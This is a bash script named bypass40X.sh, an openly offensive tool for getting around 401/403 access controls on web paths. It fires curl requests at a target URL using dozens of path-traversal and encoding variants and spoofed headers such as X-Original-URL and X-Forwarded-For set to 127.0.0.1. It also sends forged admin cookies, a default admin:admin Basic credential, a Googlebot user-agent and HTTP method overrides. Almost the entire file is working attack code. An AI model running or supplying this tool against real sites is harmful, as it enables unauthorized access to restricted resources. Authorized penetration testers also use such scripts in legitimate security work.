#!/usr/bin/env bash

cat << "EOF"
 _                               _  _    _____  __
| |__  _   _ _ __   __ _ ___ ___| || |  / _ \ \/ /
| '_ \| | | | '_ \ / _` / __/ __| || |_| | | \  /
| |_) | |_| | |_) | (_| \__ \__ \__   _| |_| /  \
|_.__/ \__, | .__/ \__,_|___/___/  |_|  \___/_/\_\
       |___/|_|
EOF

usage() {
	echo ""
    echo "Usage: bypass40X.sh -u https://example.com/path/to/restricted [-v]"
    echo "       bypass40X.sh -f urls.txt [-v]"
    exit 1
}


if [ $# -eq 0 ]; then
    usage
fi

declare -a TARGET_URLS=()
VERBOSE=false

while getopts "u:f:vh" opt; do
    case $opt in
        u)
            TARGET_URLS+=("$OPTARG")
            ;;
        f)
            if [ ! -f "$OPTARG" ]; then
                echo "Error: File $OPTARG not found"
                exit 1
            fi
            while IFS= read -r line; do
                [[ -n "$line" && ! "$line" =~ ^[[:space:]]*# ]] && TARGET_URLS+=("$line")
            done < "$OPTARG"
            ;;
        v)
            VERBOSE=true
            ;;
        h)
            usage
            ;;
        *)
            usage
            ;;
    esac
done

if [ ${#TARGET_URLS[@]} -eq 0 ]; then
    usage
fi

do_curl() {
    local url="$1"
    shift
    local headers=("$@")

    local header_params=()
    for h in "${headers[@]}"; do
        header_params+=(-H "$h")
    done

    local output
    output=$(curl -k -s -o /dev/null -w "%{http_code} %{size_download}" "${header_params[@]}" "$url" 2>/dev/null || echo "000 0")

    echo "$output"
}

char_to_percent() {
    local char="$1"
    printf '%%%02X' "'$char"
}

process_url() {
    local FULL_URL="$1"
    local BASE_URL=$(echo "$FULL_URL" | grep -oE '^https?://[^/]+')
    local PATH_PART="${FULL_URL#$BASE_URL}"

    if [ -z "$PATH_PART" ]; then
        echo "Error: URL must contain a path part after the domain: $FULL_URL"
        return
    fi

    echo ""
    read -r baseline_status baseline_size < <(do_curl "$FULL_URL")
    echo "Target URL: $FULL_URL [$baseline_status] [$baseline_size]"

    local ENCODED_LAST_CHAR=""
    local path_for_encode="$PATH_PART"

    if [[ "$path_for_encode" == */ ]]; then
        path_for_encode="${path_for_encode%/}"
    fi

    if [ -n "$path_for_encode" ]; then
        local last_char="${path_for_encode: -1}"
        local encoded_char=$(char_to_percent "$last_char")
        local path_without_last="${path_for_encode%?}"
        ENCODED_LAST_CHAR="${path_without_last}${encoded_char}"
    fi

    declare -a URLS=(
        "${BASE_URL}${PATH_PART}"
        "${BASE_URL}/%2e${PATH_PART}"
        "${BASE_URL}${PATH_PART}/."
        "${BASE_URL}/${PATH_PART}/"
        "${BASE_URL}/.${PATH_PART}/./"
        "${BASE_URL}${PATH_PART}%20"
        "${BASE_URL}${PATH_PART}%09"
        "${BASE_URL}${PATH_PART}?"
        "${BASE_URL}${PATH_PART}.html"
        "${BASE_URL}${PATH_PART}/?anything"
        "${BASE_URL}${PATH_PART}#"
        "${BASE_URL}${PATH_PART}/*"
        "${BASE_URL}${PATH_PART}.php"
        "${BASE_URL}${PATH_PART}.json"
        "${BASE_URL}${PATH_PART}..;/"
        "${BASE_URL}${PATH_PART};/"
        "${BASE_URL}${PATH_PART}%2f"
        "${BASE_URL}${PATH_PART}%252f"
        "${BASE_URL}${PATH_PART}%00"
        "${BASE_URL}${PATH_PART}%0a"
        "${BASE_URL}${PATH_PART}%2e%2e%2f"
        "${BASE_URL}${PATH_PART}%2e%2e/"
        "${BASE_URL}${PATH_PART}/../"
        "${BASE_URL}${PATH_PART}/../../"
        "${BASE_URL}${PATH_PART}%3f"
        "${BASE_URL}${PATH_PART}%23"
        "${BASE_URL}${PATH_PART}/~"
        "${BASE_URL}${PATH_PART}%7e"
        "${BASE_URL}${PATH_PART}.bak"
        "${BASE_URL}${PATH_PART}.old"
        "${BASE_URL}${PATH_PART}.orig"
        "${BASE_URL}${PATH_PART}.tmp"
        "${BASE_URL}${PATH_PART}~"
        "${BASE_URL}${PATH_PART}/index.html"
        "${BASE_URL}${PATH_PART}/index.php"
        "${BASE_URL}${PATH_PART}/default.html"
        "${BASE_URL}${PATH_PART}%c0%ae"
        "${BASE_URL}${PATH_PART}%e0%80%ae"
        "${BASE_URL}${PATH_PART}/./"
        "${BASE_URL}${PATH_PART}//"
        "${BASE_URL}${PATH_PART}////"
        "${BASE_URL}/..${PATH_PART}"
        "${BASE_URL}/%2e%2e${PATH_PART}"
        "${BASE_URL}/.${PATH_PART}"
        "${BASE_URL}/%2e${PATH_PART}"
        "${BASE_URL}///${PATH_PART}"
        "${BASE_URL}//${PATH_PART}"
        "${BASE_URL}/./${PATH_PART}"
        "${BASE_URL}/%2e/${PATH_PART}"
        "${BASE_URL}/;/${PATH_PART}"
        "${BASE_URL}/../${PATH_PART}"
        "${BASE_URL}/%2e%2e/${PATH_PART}"
        "${BASE_URL}/..;/${PATH_PART}"
        "${BASE_URL}/~/${PATH_PART}"
        "${BASE_URL}/%7e/${PATH_PART}"
        "${BASE_URL}/%00/${PATH_PART}"
        "${BASE_URL}/%20/${PATH_PART}"
        "${BASE_URL}/%09/${PATH_PART}"
        "${BASE_URL}/..../${PATH_PART}"
        "${BASE_URL}/.%2e/${PATH_PART}"
        "${BASE_URL}/%2e./${PATH_PART}"
        "${BASE_URL}/..%2f/${PATH_PART}"
        "${BASE_URL}/..%252f/${PATH_PART}"
        "${BASE_URL}/%c0%ae/${PATH_PART}"
        "${BASE_URL}/%e0%80%ae/${PATH_PART}"
        "${BASE_URL}/;..;/${PATH_PART}"
    )

    if [ -n "$ENCODED_LAST_CHAR" ]; then
        URLS+=("${BASE_URL}${ENCODED_LAST_CHAR}")
    fi

    for url in "${URLS[@]}"; do
        read -r response size < <(do_curl "$url")

        if [ "$VERBOSE" = true ]; then
            printf "[%s] [%s] %s\n" "$response" "$size" "$url"
        else
            if [ "$response" = "200" ] && [ "$response" != "$baseline_status" ] && [ "$size" != "0" ]; then
                printf "[%s] [%s] %s\n" "$response" "$size" "$url"
            elif [ "$size" != "$baseline_size" ] && [ "$response" != "000" ] && [ "$size" != "0" ]; then
                printf "[%s] [%s] %s\n" "$response" "$size" "$url"
            fi
        fi
    done

    declare -A HEADERS=(
        ["X-Original-URL"]="$PATH_PART"
        ["X-Custom-IP-Authorization"]="127.0.0.1"
        ["X-Forwarded-For"]="127.0.0.1"
        ["X-Forwarded-For-Port"]="127.0.0.1:80"
        ["X-rewrite-url"]="$PATH_PART"
        ["X-Host"]="127.0.0.1"
        ["X-Http-Method-Override"]="GET"
        ["X-Http-Method-Override-PUT"]="PUT"
        ["X-Http-Method-Override-PATCH"]="PATCH"
        ["X-Http-Method-Override-POST"]="POST"
        ["X-Forwarded-Prefix"]="/$PATH_PART"
        ["Referrer"]="${BASE_URL}${PATH_PART}"
        ["Origin"]="${BASE_URL}"
        ["X-Real-IP"]="127.0.0.1"
        ["X-Originating-IP"]="127.0.0.1"
        ["X-Remote-IP"]="127.0.0.1"
        ["X-Client-IP"]="127.0.0.1"
        ["X-Remote-Addr"]="127.0.0.1"
        ["X-Forwarded-Host"]="${BASE_URL#*://}"
        ["X-Forwarded-Server"]="${BASE_URL#*://}"
        ["X-ProxyUser-Ip"]="127.0.0.1"
        ["X-Cluster-Client-IP"]="127.0.0.1"
        ["CF-Connecting-IP"]="127.0.0.1"
        ["True-Client-IP"]="127.0.0.1"
        ["Fastly-Client-Ip"]="127.0.0.1"
        ["X-Forwarded-Proto"]="https"
        ["X-Forwarded-Scheme"]="https"
        ["X-Forwarded-Ssl"]="on"
        ["Front-End-Https"]="on"
        ["X-Url-Scheme"]="https"
        ["X-Forwarded"]="for=127.0.0.1;host=${BASE_URL#*://};proto=https"
        ["Forwarded"]="for=127.0.0.1;host=${BASE_URL#*://};proto=https"
        ["X-Override-URL"]="$PATH_PART"
        ["X-Rewrite-URL"]="$PATH_PART"
        ["X-HTTP-Method-Override"]="GET"
        ["X-HTTP-Method-Override-PUT"]="PUT"
        ["X-HTTP-Method-Override-PATCH"]="PATCH"
        ["X-HTTP-Method-Override-POST"]="POST"
        ["X-HTTP-Method"]="GET"
        ["X-HTTP-Method-PUT"]="PUT"
        ["X-HTTP-Method-PATCH"]="PATCH"
        ["X-HTTP-Method-POST"]="POST"
        ["X-Method-Override"]="GET"
        ["X-Method-Override-PUT"]="PUT"
        ["X-Method-Override-PATCH"]="PATCH"
        ["X-Method-Override-POST"]="POST"
        ["X-Method-Override-OPTIONS"]="OPTIONS"
        ["X-Method-Override-HEAD"]="HEAD"
        ["Authorization"]="Basic YWRtaW46YWRtaW4="
        ["Authorization-2"]="Bearer token123"
        ["Cookie"]="admin=true; authenticated=1; role=admin"
        ["X-Admin"]="true"
        ["X-Role"]="admin"
        ["X-Debug"]="1"
        ["X-Test"]="1"
        ["X-Override"]="1"
        ["User-Agent"]="Googlebot/2.1 (+http://www.google.com/bot.html)"
    )

    url="${BASE_URL}${PATH_PART}"
    for header in "${!HEADERS[@]}"; do
        value="${HEADERS[$header]}"
        header_name="$header"
        read -r response size < <(do_curl "$url" "$header_name: $value")

        if [ "$VERBOSE" = true ]; then
            printf "[%s] [%s] %s -H %s: %s\n" "$response" "$size" "$url" "$header_name" "$value"
        else
            if [ "$response" = "200" ] && [ "$response" != "$baseline_status" ] && [ "$size" != "0" ]; then
                printf "[%s] [%s] %s -H %s: %s\n" "$response" "$size" "$url" "$header_name" "$value"
            elif [ "$size" != "$baseline_size" ] && [ "$response" != "000" ] && [ "$size" != "0" ]; then
                printf "[%s] [%s] %s -H %s: %s\n" "$response" "$size" "$url" "$header_name" "$value"
            fi
        fi
    done

    declare -a METHODS=(
        "POST|-H Content-Length:0"
        "PATCH|-H Accept:application/json --data '{}'"
        "PATCH|-H Content-Type:application/json --data '{}'"
        "POST|-H Content-Type:application/x-www-form-urlencoded --data 'id=1'"
        "POST|-H Accept:application/json --data-raw '{\"test\":1}'"
        "PUT|-H Content-Length:0"
        "OPTIONS|-H Access-Control-Request-Method:GET"
        "HEAD|"
        "TRACE|"
        "CONNECT|"
        "PROPFIND|-H Depth:1"
        "POST|-H X-HTTP-Method-Override:GET"
        "POST|-H X-Method-Override:GET"
    )

    for method_line in "${METHODS[@]}"; do
        IFS='|' read -r method params <<< "$method_line"
        read -r response size < <(eval "curl -k -s -o /dev/null -w \"%{http_code} %{size_download}\" -X $method $params \"$url\" 2>/dev/null || echo '000 0'")

        if [ "$VERBOSE" = true ]; then
            printf "[%s] [%s] %s -X %s %s\n" "$response" "$size" "$url" "$method" "$params"
        else
            if [ "$response" = "200" ] && [ "$response" != "$baseline_status" ] && [ "$size" != "0" ]; then
                printf "[%s] [%s] %s -X %s %s\n" "$response" "$size" "$url" "$method" "$params"
            elif [ "$size" != "$baseline_size" ] && [ "$response" != "000" ] && [ "$size" != "0" ]; then
                printf "[%s] [%s] %s -X %s %s\n" "$response" "$size" "$url" "$method" "$params"
            fi
        fi
    done

    uppercase_path=$(echo "$PATH_PART" | tr '[:lower:]' '[:upper:]')
    lowercase_path=$(echo "$PATH_PART" | tr '[:upper:]' '[:lower:]')

    for variant in "$uppercase_path" "$lowercase_path"; do
        url="${BASE_URL}${variant}"
        read -r response size < <(do_curl "$url")

        if [ "$VERBOSE" = true ]; then
            printf "[%s] [%s] %s\n" "$response" "$size" "$url"
        else
            if [ "$response" = "200" ] && [ "$response" != "$baseline_status" ] && [ "$size" != "0" ]; then
                printf "[%s] [%s] %s\n" "$response" "$size" "$url"
            elif [ "$size" != "$baseline_size" ] && [ "$response" != "000" ] && [ "$size" != "0" ]; then
                printf "[%s] [%s] %s\n" "$response" "$size" "$url"
            fi
        fi
    done

    wayback_response=$(curl -s "https://archive.org/wayback/available?url=${BASE_URL}${PATH_PART}" 2>/dev/null)

    if [[ -n "$wayback_response" && "$wayback_response" != "null" ]]; then
        available=$(echo "$wayback_response" | jq -r '.archived_snapshots.closest.available // "false"' 2>/dev/null)
        snapshot_url=$(echo "$wayback_response" | jq -r '.archived_snapshots.closest.url // empty' 2>/dev/null)

        if [[ "$available" == "true" && -n "$snapshot_url" && "$snapshot_url" != "empty" ]]; then
            echo "Wayback Machine snapshot: $snapshot_url"
        fi
    fi
}

for target in "${TARGET_URLS[@]}"; do
    process_url "$target"
done
